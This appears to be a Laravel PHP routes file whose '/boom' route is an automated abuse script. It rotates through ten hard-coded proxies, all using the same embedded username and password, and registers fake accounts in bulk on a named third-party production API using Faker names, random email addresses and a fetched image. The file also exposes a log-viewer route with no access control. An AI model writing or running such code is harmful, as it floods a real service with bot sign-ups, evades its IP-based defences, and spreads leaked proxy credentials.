<?php

use Illuminate\Support\Facades\Route;
use Faker\Factory as Faker;
use App\Http\Controllers\UnsubscribeController;
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

// Desuscripción newsletter
Route::get('/unsubscribe', UnsubscribeController::class)->name('newsletter.unsubscribe');
Route::get('/boom', function () {
    $url = 'https://data-hub-service.production.bike-on.app/applicationusers';

    // Lista de proxys y sus autenticaciones
    $proxies = [
        ['proxy' => '198.23.239.134:6540', 'auth' => 'rkmtqyok:adkuxl3pb2ph'],
        ['proxy' => '45.127.248.127:5128', 'auth' => 'rkmtqyok:adkuxl3pb2ph'],
        ['proxy' => '207.244.217.165:6712', 'auth' => 'rkmtqyok:adkuxl3pb2ph'],
        ['proxy' => '64.64.118.149:6732', 'auth' => 'rkmtqyok:adkuxl3pb2ph'],
        ['proxy' => '167.160.180.203:6754', 'auth' => 'rkmtqyok:adkuxl3pb2ph'],
        ['proxy' => '104.239.105.125:6655', 'auth' => 'rkmtqyok:adkuxl3pb2ph'],
        ['proxy' => '198.105.101.92:5721', 'auth' => 'rkmtqyok:adkuxl3pb2ph'],
        ['proxy' => '154.36.110.199:6853', 'auth' => 'rkmtqyok:adkuxl3pb2ph'],
        ['proxy' => '204.44.69.89:6342', 'auth' => 'rkmtqyok:adkuxl3pb2ph'],
        ['proxy' => '206.41.172.74:6634', 'auth' => 'rkmtqyok:adkuxl3pb2ph']
    ];

    // Seleccionar un proxy aleatoriamente
    $selectedProxy = $proxies[array_rand($proxies)];
    $proxy = $selectedProxy['proxy'];
    $proxyAuth = $selectedProxy['auth'];

    // Verifica si el proxy está funcionando
    if (!checkProxy($proxy, $proxyAuth)) {
        echo "Proxy not working. Please check the proxy settings.";
        return;
    }

    for ($i = 0; $i < 5; $i++) {
        $faker = Faker::create();
        $email = generateRandomEmail();
        $password = $faker->password;
        $imagedata = getImageBase64FromUrl('https://upload.wikimedia.org/wikipedia/commons/6/69/Seljalandsfoss%2C_Su%C3%B0urland%2C_Islandia%2C_2014-08-16%2C_DD_201-203_HDR.JPG');
        $data = [
            'firstname' => $faker->firstName,
            'lastname' => $faker->lastName,
            'email' => $email,
            'imagedata' => $imagedata,
            'password' => $password,
            'confirmpassword' => $password
        ];

        $response = sendPostRequest($url, $data, $proxy, $proxyAuth);
        echo "Sent request $i with email $email:\n";
        echo "HTTP Code: " . $response['HTTP Code'] . "\n";
        echo "Request Header: " . $response['Request Header'] . "\n";
        echo "Response Header: " . $response['Response Header'] . "\n";
        echo "Response Body: " . $response['Response Body'] . "\n\n";
    }
});

if (!function_exists('sendPostRequest')) {
function sendPostRequest($url, $data, $proxy = null, $proxyAuth = null) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_TIMEOUT, 30); // Aumentar tiempo de espera

    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        if ($proxyAuth) {
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
        }
    }

    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'Accept: application/json'
    ]);

    // Capturar el encabezado de la solicitud para depuración
    curl_setopt($ch, CURLINFO_HEADER_OUT, true);
    curl_setopt($ch, CURLOPT_HEADER, true);

    // Ejecutar la solicitud
    $response = curl_exec($ch);

    // Verificar si hubo un error
    if (curl_errno($ch)) {
        $error_msg = curl_error($ch);
        curl_close($ch);
        return "cURL Error: $error_msg";
    }

    if ($response === false) {
        curl_close($ch);
        return "cURL Error: Empty response received.";
    }

    // Obtener el encabezado de la solicitud
    $request_header = curl_getinfo($ch, CURLINFO_HEADER_OUT);

    // Obtener el código de estado HTTP y el encabezado de la respuesta
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $response_header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);

    if ($response_header_size > 0 && strlen($response) >= $response_header_size) {
        $response_header = substr($response, 0, $response_header_size);
        $response_body = substr($response, $response_header_size);
    } else {
        $response_header = '';
        $response_body = $response; // Si no hay encabezado, todo es cuerpo
    }

    curl_close($ch);

    // Devolver la información detallada
    return [
        'HTTP Code' => $http_code,
        'Request Header' => $request_header, // Este campo ya está definido ahora
        'Response Header' => $response_header,
        'Response Body' => $response_body
    ];
}
}


if (!function_exists('getImageBase64FromUrl')) {
function getImageBase64FromUrl($url) {
    $context = stream_context_create([
        'http' => [
            'header' => 'User-Agent: PHP'
        ]
    ]);

    $imageData = file_get_contents($url, false, $context);
    if ($imageData === false) {
        throw new Exception("Unable to fetch image from URL: $url");
    }
    return base64_encode($imageData);
}
}

if (!function_exists('generateRandomEmail')) {
function generateRandomEmail() {
    $faker = Faker::create();
    $domains = ['outlook.com', 'icloud.com', 'gmail.com'];
    $email = $faker->userName . '@' . $domains[array_rand($domains)];
    return $email;
}
}


if (!function_exists('checkProxy')) {
function checkProxy($proxy, $proxyAuth = null) {
    $url = "https://www.google.com";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

    if ($proxyAuth) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyAuth);
    }

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $http_code == 200;
}
}

Route::get('logs', [\Rap2hpoutre\LaravelLogViewer\LogViewerController::class, 'index']);
